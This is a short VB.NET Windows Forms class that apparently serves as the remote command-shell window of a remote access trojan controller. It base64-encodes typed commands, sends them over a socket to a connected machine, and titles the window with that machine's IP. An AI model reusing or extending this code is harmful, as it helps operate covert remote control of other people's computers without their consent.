Imports System.Text
Imports System.Globalization
Imports System.Resources
Public Class cmd
    Private A As String()
    Private idx As Integer
    Private it As Integer
    Public sock As Integer
    Private Sub T2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles T2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                Dim text As String = T2.Text
                T2.Text = ""
                e.SuppressKeyPress = True
                Main.S.Send(sock, "rs" & Main.Yy & ENB([text]))
                Exit Select
        End Select
    End Sub
    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function

    Private Sub CMD_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.Text = Main.S.IP(sock)
    End Sub
End Class